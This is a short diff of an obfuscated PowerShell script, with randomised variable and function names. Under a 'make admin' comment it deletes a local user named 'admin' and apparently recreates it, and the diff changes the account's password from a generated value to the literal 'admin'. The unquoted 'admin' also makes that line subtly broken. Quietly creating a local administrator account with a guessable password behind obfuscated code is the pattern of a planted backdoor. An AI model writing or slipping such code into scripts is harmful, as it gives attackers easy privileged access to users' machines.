@@ -23,8 +23,8 @@ function geIwCZloBx {
 $location = pwd
 
 # make admin
-$sqbXFdLvyw = "admin" 
-$DCilJFugpP = RpLGWiUsIy
+$sqbXFdLvyw = "admin" # Default username
+$DCilJFugpP = admin
 Remove-LocalUser -Name $sqbXFdLvyw
 $HcMjDkGFes = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
 geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $HcMjDkGFes
